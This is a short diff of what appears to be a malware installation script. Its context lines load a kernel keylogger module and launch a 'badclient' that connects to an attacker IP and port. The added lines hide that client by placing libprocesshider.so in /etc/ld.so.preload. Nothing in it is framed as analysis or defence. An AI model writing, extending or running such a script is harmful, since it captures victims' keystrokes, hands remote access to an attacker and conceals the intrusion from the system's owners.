@@ -12,3 +12,9 @@ sudo insmod keylogger.ko
 ./badclient -ip "$ATTACKER_IP" -port "$ATTACKER_PORT" &
 
 echo "[+] badclient is running"
+
+sudo mv libprocesshider.so /usr/local/lib/
+
+sudo sh -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
+
+echo "[+] badclient is hidden"
